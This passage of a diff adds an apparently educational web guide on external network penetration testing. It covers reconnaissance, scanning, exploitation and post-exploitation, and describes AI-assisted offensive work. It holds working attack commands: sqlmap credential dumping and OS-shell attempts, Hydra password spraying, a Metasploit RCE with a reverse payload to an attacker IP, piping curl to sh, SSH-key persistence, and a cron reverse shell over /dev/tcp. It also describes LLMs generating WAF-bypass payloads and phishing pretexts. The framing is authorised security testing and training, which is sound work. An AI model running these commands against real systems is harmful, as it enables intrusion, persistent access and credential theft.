+    <div class="vc"><span class="vcn">03</span><div class="vcname">DNS Infrastructure</div><div class="vcdesc">Authoritative DNS servers, zone transfer misconfiguration, dangling DNS records pointing to abandoned cloud resources (subdomain takeover). Zone transfers expose the full internal network topology to any requester. Subdomain takeover allows attackers to host content under the victim's trusted domain — trivially weaponisable for credential phishing.</div><span class="sev sh">HIGH</span></div>
+    <div class="vc"><span class="vcn">04</span><div class="vcname">VPN &amp; Remote Access</div><div class="vcdesc">SSL-VPN portals (Pulse Secure, Fortinet, Cisco AnyConnect), RDP exposed to the internet, Citrix gateways. SSL-VPN CVEs have been massively exploited by ransomware groups and nation-state actors. Internet-facing RDP is subject to continuous credential stuffing and BlueKeep-type vulnerability exploitation.</div><span class="sev sc">CRITICAL</span></div>
+    <div class="vc"><span class="vcn">05</span><div class="vcname">Cloud &amp; API Endpoints</div><div class="vcdesc">Public cloud storage (S3, Azure Blob, GCS) with misconfigured access controls, REST APIs lacking authentication or rate limiting, GraphQL introspection enabled in production, and serverless function endpoints with insufficient input validation. Cloud misconfigurations consistently rank as the top data breach cause globally.</div><span class="sev sc">CRITICAL</span></div>
+    <div class="vc"><span class="vcn">06</span><div class="vcname">Network Management Exposed</div><div class="vcdesc">SSH management ports on cloud instances, Kubernetes API servers, Docker daemon exposed without TLS, Jenkins/GitLab CI with public access, and monitoring dashboards (Grafana, Kibana) without authentication. Development tooling inadvertently exposed to the internet provides direct code execution and credential access pathways.</div><span class="sev sc">CRITICAL</span></div>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══ 03 — PLANNING ══ -->
+<section class="sec rv" id="planning">
+  <div class="sec-hd"><span class="sec-n">03 //</span><h2 class="sec-t">Phase I — Planning &amp; Preparation<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+
+  <div class="panel rv-l">
+    <p>A well-scoped external penetration test begins weeks before the first tool is run. Thorough planning defines the boundaries of the engagement, prevents accidental testing of out-of-scope third-party infrastructure (a common legal hazard when testing organisations using shared hosting or cloud CDNs), and ensures the testing team has the right tools, credentials, and escalation procedures in place before going live.</p>
+  </div>
+
+  <div class="panel rv">
+    <div class="panel-t">Pre-Engagement Checklist</div>
+    <ul class="chk">
+      <li><span class="chk-i"></span><span><strong>Scope Definition</strong> — Document all in-scope IP ranges, domains, and subdomains in writing. Explicitly list out-of-scope systems (third-party SaaS, shared CDN IPs, payment processors).</span></li>
+      <li><span class="chk-i"></span><span><strong>Written Authorisation</strong> — Obtain signed Rules of Engagement from an organisational authority with legal standing to grant it. Ensure it covers the testing window, permitted techniques, and data handling requirements.</span></li>
+      <li><span class="chk-i"></span><span><strong>Business Risk Context</strong> — Identify the organisation's critical business functions and which external assets support them. Prioritise testing accordingly — a payment gateway outage has different impact than a marketing microsite.</span></li>
+      <li><span class="chk-i"></span><span><strong>Compliance Requirements</strong> — Confirm which compliance frameworks apply (PCI-DSS, ISO 27001, SOC 2, GDPR) and ensure the test methodology satisfies their specific requirements for evidence and documentation.</span></li>
+      <li><span class="chk-i"></span><span><strong>Toolset Preparation</strong> — Provision a clean attack VM, configure VPN tunnel from attack infrastructure, set up logging of all testing activity, and verify tool versions are current (Nmap, Nessus/OpenVAS, Metasploit, Burp Suite, Amass, Nuclei).</span></li>
+      <li><span class="chk-i"></span><span><strong>Emergency Escalation</strong> — Confirm the 24/7 escalation contact for critical findings discovered during testing. Define the threshold for immediate notification (e.g. active breach evidence, imminent ransomware-ready access).</span></li>
+    </ul>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══ 04 — RECONNAISSANCE ══ -->
+<section class="sec rv" id="recon">
+  <div class="sec-hd"><span class="sec-n">04 //</span><h2 class="sec-t">Phase II — Reconnaissance &amp; OSINT<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+
+  <div class="panel rv-l">
+    <p>External reconnaissance builds a comprehensive picture of the target's internet-facing footprint from publicly available sources — without generating any traffic to the target's infrastructure. This passive phase frequently surfaces the most impactful findings: forgotten subdomains pointing to abandoned infrastructure, credentials in public code repositories, exposed API keys in JavaScript files, and sensitive documents indexed by search engines that were never intended to be public.</p>
+  </div>
+
+  <div class="tgrid rv">
+    <div class="tc"><div class="tcname">Amass / Subfinder</div><span class="tctag">Passive · Subdomain</span><div class="tcdesc">Passive and active subdomain enumeration using DNS, certificate transparency, APIs (VirusTotal, Shodan, Censys). Discovers forgotten subdomains pointing to defunct infrastructure</div></div>
+    <div class="tc"><div class="tcname">Shodan / Censys</div><span class="tctag">Passive · OSINT</span><div class="tcdesc">Internet-wide scan databases — identify all services, versions, and open ports associated with target IP ranges and domains without generating target-facing traffic</div></div>
+    <div class="tc"><div class="tcname">theHarvester</div><span class="tctag">Passive · Email/OSINT</span><div class="tcdesc">Aggregates email addresses, employee names, subdomains, and IP ranges from search engines, LinkedIn, and data breach repositories</div></div>
+    <div class="tc"><div class="tcname">DNSDumpster / dig</div><span class="tctag">Passive · DNS</span><div class="tcdesc">Full DNS record enumeration — A, AAAA, MX, TXT, CNAME, SPF, DKIM records. Zone transfer testing. Reveals mail server topology and cloud provider information</div></div>
+    <div class="tc"><div class="tcname">Google Dorking</div><span class="tctag">Passive · Search</span><div class="tcdesc">Advanced search operators extract sensitive indexed content — exposed config files, login panels, API keys in public repos, cached password reset pages</div></div>
+    <div class="tc"><div class="tcname">Wayback Machine / gau</div><span class="tctag">Passive · History</span><div class="tcdesc">Historical URL discovery — surfaces old endpoints, backup files, parameter structures, and previously exposed paths no longer linked from the live site</div></div>
+  </div>
+
+  <div class="cb rv" data-l="Passive Reconnaissance — Full OSINT Workflow">
+    <code><span class="cmt"># Subdomain enumeration — find all domains and subdomains</span>
+<span class="cmd">amass enum</span> <span class="flag">-passive -d</span> <span class="prm">target.com</span> <span class="flag">-o</span> subdomains.txt
+<span class="cmd">subfinder</span> <span class="flag">-d</span> <span class="prm">target.com</span> <span class="flag">-o</span> subfinder_out.txt
+<span class="cmd">cat</span> subdomains.txt subfinder_out.txt | <span class="cmd">sort -u</span> > all_subdomains.txt
+
+<span class="cmt"># DNS records — full enumeration of DNS surface</span>
+<span class="cmd">dig</span> <span class="flag">ANY</span> <span class="prm">target.com</span>                          <span class="cmt"># All DNS records</span>
+<span class="cmd">dig</span> <span class="flag">AXFR</span> <span class="prm">target.com</span> <span class="flag">@ns1.target.com</span>        <span class="cmt"># Zone transfer attempt</span>
+<span class="cmd">dnsx</span> <span class="flag">-l</span> all_subdomains.txt <span class="flag">-a -cname -resp</span>  <span class="cmt"># Resolve all subdomains</span>
+
+<span class="cmt"># Check for subdomain takeover — look for dangling DNS to inactive services</span>
+<span class="cmd">subjack</span> <span class="flag">-w</span> all_subdomains.txt <span class="flag">-t 100 -o</span> takeover_candidates.txt
+
+<span class="cmt"># Email and employee OSINT</span>
+<span class="cmd">theHarvester</span> <span class="flag">-d</span> <span class="prm">target.com</span> <span class="flag">-b all -l 500</span>
+
+<span class="cmt"># Google Dorking — sensitive indexed content</span>
+<span class="cmt"># site:target.com filetype:sql OR filetype:env OR filetype:log</span>
+<span class="cmt"># site:target.com inurl:admin OR inurl:login OR inurl:config</span>
+<span class="cmt"># site:target.com "api_key" OR "password" OR "secret"</span>
+
+<span class="cmt"># Historical URL discovery with gau (Get All URLs)</span>
+<span class="cmd">gau</span> <span class="prm">target.com</span> | <span class="cmd">grep</span> <span class="flag">-E</span> <span class="str">'\.php|\.asp|\.env|backup|config|admin'</span>
+
+<span class="cmt"># Shodan CLI — passive service fingerprinting</span>
+<span class="cmd">shodan</span> search <span class="str">"hostname:target.com"</span>
+<span class="cmd">shodan</span> domain <span class="prm">target.com</span></code>
+  </div>
+
+  <div class="cb rv" data-l="Active Reconnaissance — Service Fingerprinting">
+    <code><span class="cmt"># Nmap — full port scan with service/version detection on discovered hosts</span>
+<span class="cmd">nmap</span> <span class="flag">-sS -sV -sC -O -p-</span> <span class="flag">--open -T4</span> <span class="prm">&lt;TARGET-IP&gt;</span> <span class="flag">-oA</span> nmap_full
+
+<span class="cmt"># Targeted scan of common external service ports</span>
+<span class="cmd">nmap</span> <span class="flag">-sV -p</span> 21,22,25,53,80,110,143,443,465,587,993,995,3306,8080,8443 \
+     <span class="flag">--script</span> banner,http-title,ssl-cert <span class="prm">&lt;TARGET-IP-RANGE&gt;</span>
+
+<span class="cmt"># SSL/TLS certificate analysis — extract hostnames, expiry, issuer</span>
+<span class="cmd">nmap</span> <span class="flag">--script</span> ssl-cert,ssl-enum-ciphers <span class="flag">-p 443,8443</span> <span class="prm">&lt;TARGET-IP&gt;</span>
+
+<span class="cmt"># HTTP technology fingerprinting</span>
+<span class="cmd">whatweb</span> <span class="flag">-a 3</span> https://<span class="prm">target.com</span>
+<span class="cmd">httpx</span> <span class="flag">-l</span> all_subdomains.txt <span class="flag">-title -tech-detect -status-code -o</span> live_hosts.txt
+
+<span class="cmt"># Email security — check SPF, DKIM, DMARC configuration</span>
+<span class="cmd">dig</span> TXT <span class="prm">target.com</span> | <span class="cmd">grep</span> <span class="str">"v=spf"</span>
+<span class="cmd">dig</span> TXT <span class="str">_dmarc.</span><span class="prm">target.com</span>
+<span class="cmd">nmap</span> <span class="flag">--script</span> smtp-open-relay <span class="flag">-p 25</span> <span class="prm">&lt;MAIL-SERVER-IP&gt;</span></code>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══ 05 — SCANNING ══ -->
+<section class="sec rv" id="scan">
+  <div class="sec-hd"><span class="sec-n">05 //</span><h2 class="sec-t">Phase III — Vulnerability Scanning &amp; Enumeration<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+
+  <div class="panel rv-l">
+    <p>With the external attack surface fully mapped and all live services identified, the assessment moves into active vulnerability scanning. This phase identifies specific, exploitable weaknesses in discovered services — outdated software with known CVEs, web application vulnerabilities, misconfigured services, and weak authentication. Automated scanners like Nessus, OpenVAS, and Nuclei provide broad coverage efficiently; manual analysis is required to confirm, contextualise, and de-duplicate findings to avoid false positives entering the final report.</p>
+  </div>
+
+  <div class="cb rv" data-l="Vulnerability Scanning — Nessus, Nuclei &amp; OpenVAS">
+    <code><span class="cmt"># Nuclei — fast template-based vulnerability scanner (2,000+ community templates)</span>
+<span class="cmd">nuclei</span> <span class="flag">-l</span> live_hosts.txt <span class="flag">-t cves/ -t exposures/ -t misconfigurations/</span> \
+       <span class="flag">-severity critical,high</span> <span class="flag">-o</span> nuclei_critical.txt
+
+<span class="cmt"># Scan specific target with all templates including network and SSL checks</span>
+<span class="cmd">nuclei</span> <span class="flag">-u</span> https://<span class="prm">target.com</span> <span class="flag">-t all/</span> <span class="flag">-c 50 -o</span> nuclei_full.txt
+
+<span class="cmt"># Web content discovery — find hidden files, directories, and endpoints</span>
+<span class="cmd">gobuster dir</span> <span class="flag">-u</span> https://<span class="prm">target.com</span> \
+  <span class="flag">-w</span> /usr/share/wordlists/dirb/common.txt \
+  <span class="flag">-x</span> php,html,asp,aspx,txt,bak,old,env,config \
+  <span class="flag">-t 50 -o</span> gobuster_results.txt
+
+<span class="cmt"># Alternative with ffuf for faster fuzzing with custom headers</span>
+<span class="cmd">ffuf</span> <span class="flag">-u</span> https://<span class="prm">target.com</span>/FUZZ \
+  <span class="flag">-w</span> /usr/share/wordlists/discovery/web-content.txt \
+  <span class="flag">-H</span> <span class="str">"User-Agent: Mozilla/5.0"</span> \
+  <span class="flag">-mc 200,301,302,403</span> <span class="flag">-o</span> ffuf_results.json
+
+<span class="cmt"># Nikto — web server misconfiguration and vulnerability scanner</span>
+<span class="cmd">nikto</span> <span class="flag">-h</span> https://<span class="prm">target.com</span> <span class="flag">-ssl -nointeractive -o</span> nikto_results.txt
+
+<span class="cmt"># searchsploit — find local exploit database entries for discovered software</span>
+<span class="cmd">searchsploit</span> <span class="str">"Apache 2.4.49"</span>
+<span class="cmd">searchsploit</span> <span class="str">"OpenSSH 8.2"</span></code>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══ 06 — EXPLOITATION ══ -->
+<section class="sec rv" id="exploit">
+  <div class="sec-hd"><span class="sec-n">06 //</span><h2 class="sec-t">Phase IV — Exploitation<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+
+  <div class="panel rv-l">
+    <p>Exploitation validates that identified vulnerabilities are genuinely exploitable from an external attacker's position — transforming a theoretical risk score into demonstrated business impact with proof-of-concept evidence. External exploitation must be conducted carefully: web servers serve live users, mail servers process real business communications, and a miscalibrated exploit can cause unintended service disruption. Every exploitation step must be documented with timestamps, commands executed, and output captured.</p>
+  </div>
+
+  <div class="atk rv">
+    <div class="atk-name">⟩ Web Application Vulnerability Exploitation</div>
+    <div class="atk-body">Web application vulnerabilities are the dominant external exploitation path. SQL injection, Server-Side Request Forgery (SSRF), Local/Remote File Inclusion, and command injection in web application parameters are commonly discovered in external assessments — especially in bespoke applications and CMS plugins that receive less security scrutiny than commercial software. SQLmap automates SQL injection exploitation; Burp Suite provides the interception and manipulation capability for manual exploitation of complex vulnerabilities.</div>
+    <div class="cb" data-l="SQLmap — Automated SQL Injection Exploitation">
+      <code><span class="cmt"># Detect and enumerate databases via SQLi in URL parameter</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="str">"https://target.com/page.php?id=1"</span> <span class="flag">--dbs --batch</span>
+
+<span class="cmt"># Dump tables from a specific database</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="str">"https://target.com/page.php?id=1"</span> <span class="flag">-D</span> targetdb <span class="flag">--tables</span>
+
+<span class="cmt"># Extract credentials table with column names</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="str">"https://target.com/page.php?id=1"</span> \
+       <span class="flag">-D</span> targetdb <span class="flag">-T</span> users <span class="flag">--columns --dump</span>
+
+<span class="cmt"># Test POST request body — capture from Burp Suite and save as request.txt</span>
+<span class="cmd">sqlmap</span> <span class="flag">-r</span> request.txt <span class="flag">--dbs --level=3 --risk=2</span>
+
+<span class="cmt"># Attempt OS shell if DBMS has FILE privilege (e.g. MySQL running as root)</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="str">"https://target.com/page.php?id=1"</span> <span class="flag">--os-shell</span>
+
+<span class="cmt"># Bypass WAF with tamper scripts</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="str">"https://target.com/page.php?id=1"</span> \
+       <span class="flag">--tamper=space2comment,between,charencode</span> <span class="flag">--dbs</span></code>
+    </div>
+  </div>
+
+  <div class="atk rv">
+    <div class="atk-name">⟩ Credential-Based Attacks — Brute Force &amp; Spray</div>
+    <div class="atk-body">Login portals on external systems — webmail, VPN gateways, admin panels, SSH, and exposed management interfaces — are targets for credential-based attacks. Password spraying (one password against many users) is far more effective than brute-force against modern systems with lockout policies, and frequently succeeds because users across large organisations commonly choose seasonal or company-name-derived passwords. Credential stuffing using data breach databases also delivers high success rates against organisations where employees reuse passwords.</div>
+    <div class="cb" data-l="Hydra — External Service Credential Testing">
+      <code><span class="cmt"># Password spray against SSH — one password, many users, avoids lockout</span>
+<span class="cmd">hydra</span> <span class="flag">-L</span> users.txt <span class="flag">-p</span> <span class="str">'Summer2024!'</span> \
+      <span class="flag">-t 4 -W 30</span> ssh://<span class="prm">&lt;TARGET-IP&gt;</span>
+
+<span class="cmt"># SMTP webmail (OWA / Exchange) credential attack</span>
+<span class="cmd">hydra</span> <span class="flag">-L</span> emails.txt <span class="flag">-P</span> passwords.txt <span class="flag">-s 443</span> \
+      https-post-form://<span class="prm">mail.target.com</span>/owa/auth/owaauth.dll:<span class="str">'destination=%2Fowa%2F&flags=0&username=^USER^&password=^PASS^:The+user+name+or+password+is+incorrect'</span>
+
+<span class="cmt"># FTP brute force — still common on legacy file servers</span>
+<span class="cmd">hydra</span> <span class="flag">-l</span> <span class="str">anonymous</span> <span class="flag">-p</span> <span class="str">anonymous</span> ftp://<span class="prm">&lt;TARGET-IP&gt;</span>
+
+<span class="cmt"># Use Metasploit for HTTP form authentication brute force</span>
+<span class="cmd">use</span> auxiliary/scanner/http/http_login
+<span class="cmd">set</span> RHOSTS <span class="prm">&lt;TARGET-IP&gt;</span>
+<span class="cmd">set</span> TARGETURI /admin/login
+<span class="cmd">set</span> USER_FILE users.txt
+<span class="cmd">set</span> PASS_FILE passwords.txt
+<span class="cmd">run</span></code>
+    </div>
+  </div>
+
+  <div class="atk rv">
+    <div class="atk-name">⟩ Known CVE Exploitation via Metasploit &amp; Exploit-DB</div>
+    <div class="atk-body">Discovered service versions are cross-referenced against public vulnerability databases to identify exploitable CVEs. Exploit-DB, the Metasploit module library, GitHub proof-of-concept repositories, and the CISA Known Exploited Vulnerabilities Catalogue all provide reliable exploit code for well-known vulnerabilities. The key discipline is confirming the exact version match before launching an exploit — a version mismatch against a production server can cause unexpected crashes and service disruption.</div>
+    <div class="cb" data-l="Metasploit — CVE Exploitation Workflow">
+      <code><span class="cmt"># Step 1: Research discovered service versions</span>
+<span class="cmd">searchsploit</span> <span class="str">"Apache 2.4.49"</span>       <span class="cmt"># CVE-2021-41773 — path traversal RCE</span>
+<span class="cmd">searchsploit</span> <span class="str">"Drupal 7"</span>            <span class="cmt"># Drupalgeddon2 / SA-CORE-2018-002</span>
+
+<span class="cmt"># Step 2: Select appropriate Metasploit module</span>
+<span class="cmd">search</span> type:exploit name:apache cve:2021
+<span class="cmd">use</span> exploit/multi/http/apache_normalize_path_rce
+
+<span class="cmt"># Step 3: Configure target and payload</span>
+<span class="cmd">set</span> RHOSTS <span class="prm">&lt;TARGET-IP&gt;</span>
+<span class="cmd">set</span> RPORT 443
+<span class="cmd">set</span> SSL <span class="kw">true</span>
+<span class="cmd">set</span> PAYLOAD linux/x64/meterpreter/reverse_tcp
+<span class="cmd">set</span> LHOST <span class="prm">&lt;ATTACKER-IP&gt;</span>
+<span class="cmd">set</span> LPORT 4444
+
+<span class="cmt"># Step 4: Run check (safe verification) before exploiting</span>
+<span class="cmd">check</span>
+
+<span class="cmt"># Step 5: Execute exploitation</span>
+<span class="cmd">exploit</span></code>
+    </div>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══ 07 — POST-EXPLOITATION ══ -->
+<section class="sec rv" id="post">
+  <div class="sec-hd"><span class="sec-n">07 //</span><h2 class="sec-t">Phase V — Post-Exploitation &amp; Persistence<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+
+  <div class="panel rv-l">
+    <p>Post-exploitation demonstrates the full scope of impact from a successful external compromise. An attacker who gains remote code execution on an internet-facing server does not stop there — they escalate privileges, establish persistence to survive reboots and credential resets, harvest credentials to enable lateral movement, and map the internal network from the newly gained vantage point. Demonstrating this full kill chain to the organisation communicates risk far more effectively than a list of CVSSv3 scores alone.</p>
+  </div>
+
+  <div class="cb rv" data-l="Post-Exploitation — Linux Server Privilege Escalation">
+    <code><span class="cmt"># Initial situational awareness on compromised Linux web server</span>
+<span class="cmd">id</span> && <span class="cmd">whoami</span>                  <span class="cmt"># Current user context</span>
+<span class="cmd">uname</span> <span class="flag">-a</span>                      <span class="cmt"># Kernel version — check for local privesc CVEs</span>
+<span class="cmd">cat</span> /etc/passwd | <span class="cmd">grep</span> -v nologin  <span class="cmt"># List shell-enabled accounts</span>
+<span class="cmd">ss</span> <span class="flag">-tlnp</span>                       <span class="cmt"># Internal listening services (not externally exposed)</span>
+<span class="cmd">ip route</span>                       <span class="cmt"># Internal network routing — reveals internal subnets</span>
+
+<span class="cmt"># Run LinPEAS — automated Linux privilege escalation auditor</span>
+<span class="cmd">curl</span> <span class="flag">-L</span> https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | <span class="cmd">sh</span>
+
+<span class="cmt"># Check for sudo privileges — common misconfiguration</span>
+<span class="cmd">sudo</span> <span class="flag">-l</span>
+
+<span class="cmt"># Check for SUID binaries — local privilege escalation via GTFOBins</span>
+<span class="cmd">find</span> / <span class="flag">-perm -u=s -type f</span> 2>/dev/null
+
+<span class="cmt"># Dirty COW (CVE-2016-5195) — kernel privilege escalation example</span>
+<span class="cmd">searchsploit</span> <span class="str">"dirty cow"</span>
+
+<span class="cmt"># Harvest credentials from the web application</span>
+<span class="cmd">find</span> /var/www <span class="flag">-name "*.php" -o -name "config.yml" -o -name ".env"</span> | \
+  <span class="cmd">xargs grep</span> <span class="flag">-l</span> <span class="str">"password\|DB_PASS\|db_password\|secret"</span></code>
+  </div>
+
+  <div class="cb rv" data-l="Persistence — Maintaining Access After Exploitation">
+    <code><span class="cmt"># Establish SSH key persistence — add attacker public key to authorized_keys</span>
+<span class="cmd">mkdir</span> <span class="flag">-p</span> ~/.ssh && <span class="cmd">echo</span> <span class="str">"ssh-rsa &lt;ATTACKER_PUBLIC_KEY&gt;"</span> >> ~/.ssh/authorized_keys
+<span class="cmd">chmod</span> 600 ~/.ssh/authorized_keys
+
+<span class="cmt"># Cron-based persistence — reverse shell every 5 minutes</span>
+<span class="cmd">echo</span> <span class="str">"*/5 * * * * /bin/bash -i >& /dev/tcp/&lt;ATTACKER-IP&gt;/4444 0>&1"</span> | <span class="cmd">crontab -</span>
+
+<span class="cmt"># Netcat listener for incoming reverse shell connection</span>
+<span class="cmd">nc</span> <span class="flag">-lvnp 4444</span>
+
+<span class="cmt"># Metasploit persistence module — survives reboots via upstart/systemd service</span>
+<span class="cmd">use</span> post/linux/manage/sshkey_persistence
+<span class="cmd">set</span> SESSION <span class="num">1</span>
+<span class="cmd">run</span>
+
+<span class="cmt"># PowerShell Empire / Sliver C2 for long-term assessment persistence
+# (Always document and destroy all persistence mechanisms post-engagement)</span></code>
+  </div>
+
+  <div class="panel rv">
+    <div class="panel-t">Complete Tool Reference by Phase</div>
+    <table class="ptbl">
+      <thead><tr><th>Phase</th><th>Primary Tools</th></tr></thead>
+      <tbody>
+        <tr><td>Reconnaissance</td><td>Amass, Subfinder, Shodan, Censys, theHarvester, DNSDumpster, gau, Wayback Machine</td></tr>
+        <tr><td>Scanning &amp; Enumeration</td><td>Nmap, Nuclei, Nikto, Gobuster, ffuf, WhatWeb, httpx, searchsploit</td></tr>
+        <tr><td>Exploitation</td><td>Metasploit, SQLmap, Hydra, Medusa, Burp Suite, Exploit-DB PoCs</td></tr>
+        <tr><td>Post-Exploitation</td><td>LinPEAS, WinPEAS, Mimikatz, PowerShell Empire, Sliver, Netcat, Meterpreter</td></tr>
+        <tr><td>Reporting</td><td>Plextrac, Dradis, Serpico, Ghostwriter, custom templates</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<div class="div div-ai"></div>
+
+<!-- ══ 08 — AI INTEGRATION ══ -->
+<section class="sec rv sec-ai" id="ai">
+  <div class="sec-hd"><span class="sec-n">08 //</span><h2 class="sec-t">AI Integration in External Network Penetration Testing<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+
+  <div class="panel panel-ai rv-l">
+    <p>Artificial Intelligence is fundamentally changing what is possible in external network penetration testing — dramatically compressing the time between reconnaissance and exploitation, enabling attack surface discovery at a scale no human team could achieve manually, and generating adaptive payloads that evade static detection signatures. On the defensive side, AI provides the continuous monitoring capability needed to detect the kind of low-and-slow reconnaissance that precedes most real-world external breaches.</p>
+    <p>For penetration testers, AI is not a replacement for expertise — it is a force multiplier. An experienced tester augmented with AI-assisted reconnaissance, intelligent vulnerability prioritisation, and automated report generation can deliver the same depth of assessment in significantly less time, or achieve far greater breadth within the same engagement window.</p>
+  </div>
+
+  <div class="alert al-p rv">
+    <span class="al-ic">[ AI ]</span>
+    <p class="al-tx">A 2024 SANS survey found that <strong>68% of penetration testers</strong> now use AI-assisted tools in at least one phase of their engagements. Attack surface enumeration and report generation are the two phases where AI delivers the highest time savings — reducing each by 40–60% in controlled studies.</p>
+  </div>
+
+  <h3 style="font-family:var(--mono);font-size:11px;letter-spacing:3px;color:var(--p);text-transform:uppercase;margin:28px 0 16px;">AI-Powered Offensive Capabilities</h3>
+  <div class="ai-grid rv">
+    <div class="ai-card"><span class="ai-ico">🌐</span><div class="ai-name">AI Attack Surface Discovery</div><div class="ai-desc">Large language models process OSINT data from dozens of sources simultaneously — correlating certificate transparency logs, DNS records, GitHub repositories, job postings, and dark web data to build a comprehensive external attack surface map in minutes rather than hours.</div></div>
+    <div class="ai-card"><span class="ai-ico">🔍</span><div class="ai-name">Intelligent Vulnerability Research</div><div class="ai-desc">AI models cross-reference discovered software versions against CVE databases, Exploit-DB, and PoC repositories in real time — instantly surfacing the highest-severity exploitable vulnerabilities for a given target's service stack and presenting them ranked by exploitability and business impact.</div></div>
+    <div class="ai-card"><span class="ai-ico">⚗️</span><div class="ai-name">Payload Generation &amp; Mutation</div><div class="ai-desc">LLMs generate custom exploit payloads, WAF bypass strings, and encoding variants tailored to the specific application technology stack observed during reconnaissance — dramatically reducing the trial-and-error iteration cycle that manual payload crafting requires against hardened targets.</div></div>
+    <div class="ai-card"><span class="ai-ico">🎭</span><div class="ai-name">Social Engineering Intelligence</div><div class="ai-desc">AI analyses harvested employee data, organisational structure, and recent public communications to generate highly targeted and contextually credible phishing pretexts — simulating the level of personalisation that advanced persistent threat actors use in real-world campaigns targeting external users.</div></div>
+    <div class="ai-card"><span class="ai-ico">🗂</span><div class="ai-name">Automated Report Generation</div><div class="ai-desc">LLMs convert raw exploitation output — session logs, screenshot annotations, vulnerability scanner results — into structured penetration test findings with CVSS scores, business impact narratives, and step-by-step remediation guidance, reducing post-engagement reporting time by 50–70%.</div></div>
+    <div class="ai-card"><span class="ai-ico">🔗</span><div class="ai-name">Attack Chain Identification</div><div class="ai-desc">Graph-based AI models analyse the full vulnerability set discovered across an external assessment and automatically identify multi-step attack chains — demonstrating how combining a credential exposure on one service with a misconfiguration on another reaches a higher-value target that neither vulnerability alone would access.</div></div>
+  </div>
+
+  <h3 style="font-family:var(--mono);font-size:11px;letter-spacing:3px;color:var(--p);text-transform:uppercase;margin:32px 0 16px;">AI-Powered Defensive Capabilities</h3>
+  <div class="ai-grid rv">
+    <div class="ai-card"><span class="ai-ico">🛰</span><div class="ai-name">Continuous External Exposure Monitoring</div><div class="ai-desc">AI-driven attack surface management platforms (ASM) — CyCognito, Censys ASM, Mandiant ASM — continuously scan an organisation's external footprint and alert on newly exposed services, certificate expirations, subdomain takeover risks, and leaked credentials in real time, without requiring a scheduled pen test.</div></div>
+    <div class="ai-card"><span class="ai-ico">🧠</span><div class="ai-name">AI-Driven Threat Intelligence</div><div class="ai-desc">ML models correlate threat intelligence feeds, dark web monitoring, and observed attack patterns to predict which external vulnerabilities in your specific technology stack are most likely to be exploited in the near term — enabling proactive risk prioritisation rather than reactive patching.</div></div>
+    <div class="ai-card"><span class="ai-ico">🚨</span><div class="ai-name">Reconnaissance Detection</div><div class="ai-desc">AI analyses web server logs, DNS query patterns, and firewall events to detect the systematic port scanning, subdomain enumeration, and directory fuzzing that precedes most external attacks — alerting defenders during the reconnaissance phase, not after initial compromise.</div></div>
+    <div class="ai-card"><span class="ai-ico">🔒</span><div class="ai-name">Automated Vulnerability Triage</div><div class="ai-desc">AI processes vulnerability scanner output and contextualises findings against the specific organisation — considering asset criticality, network exposure, exploit availability, and compensating controls to produce a risk-adjusted priority list that replaces the generic CVSS-sorted spreadsheet most organisations still use.</div></div>
+    <div class="ai-card"><span class="ai-ico">🤖</span><div class="ai-name">AI-Powered WAF Rules</div><div class="ai-desc">Modern WAF platforms use ML models trained on attack patterns to generate dynamic blocking rules that adapt to novel attack variants — detecting SQL injection, XSS, and LFI payloads that deliberately evade static signature-based rules through encoding, fragmentation, or parameter manipulation.</div></div>
+    <div class="ai-card"><span class="ai-ico">📈</span><div class="ai-name">Breach Prediction Modelling</div><div class="ai-desc">AI models trained on historical breach data, current threat intelligence, and organisational security posture metrics generate probability scores for specific breach scenarios — enabling security teams to invest in the controls that reduce the highest-probability, highest-impact attack paths first.</div></div>
+  </div>
+
+  <div class="cb rv cb-ai" data-l="AI-Assisted — Python Recon Pipeline with LLM Analysis">
+    <code><span class="cmt"># AI-augmented external recon pipeline — combines tool output with GPT analysis</span>
+<span class="kw">import</span> subprocess, openai, json
+
+<span class="cmt"># Step 1: Automated subdomain and service discovery</span>
+subdomains = subprocess.<span class="fn">run</span>(
+    [<span class="str">'subfinder'</span>, <span class="str">'-d'</span>, <span class="prm">target_domain</span>, <span class="str">'-silent'</span>],
+    capture_output=<span class="kw">True</span>, text=<span class="kw">True</span>
+).stdout.strip().split(<span class="str">'\n'</span>)
+
+nmap_out = subprocess.<span class="fn">run</span>(
+    [<span class="str">'nmap'</span>, <span class="str">'-sV'</span>, <span class="str">'-T4'</span>, <span class="str">'-oJ'</span>, <span class="str">'-'</span>] + subdomains[:10],
+    capture_output=<span class="kw">True</span>, text=<span class="kw">True</span>
+).stdout
+
+<span class="cmt"># Step 2: Feed to AI for intelligent attack surface analysis</span>
+client = openai.<span class="fn">OpenAI</span>()
+response = client.chat.completions.<span class="fn">create</span>(
+    model=<span class="str">"gpt-4o"</span>,
+    messages=[{<span class="str">"role"</span>:<span class="str">"user"</span>, <span class="str">"content"</span>: <span class="str">f"""
+You are an expert external network penetration tester.
+Analyse this reconnaissance output for {target_domain}:
+
+Subdomains discovered: {json.dumps(subdomains[:20])}
+Nmap service scan: {nmap_out[:3000]}
+
+Provide:
+1. Top 5 highest-priority attack vectors ranked by exploitability
+2. Specific CVEs to investigate for each discovered service version
+3. Recommended Metasploit modules or tools for each finding
+4. Subdomain takeover candidates from the list
+5. Estimated time to compromise for each attack path
+"""</span>}]
+)
+<span class="fn">print</span>(response.choices[<span class="num">0</span>].message.content)</code>
+  </div>
+
+  <div class="cb rv cb-ai" data-l="AI — Automated External PT Report Generation">
+    <code><span class="cmt"># Generate a structured finding from raw exploitation evidence</span>
+<span class="kw">import</span> openai
+
+finding = {
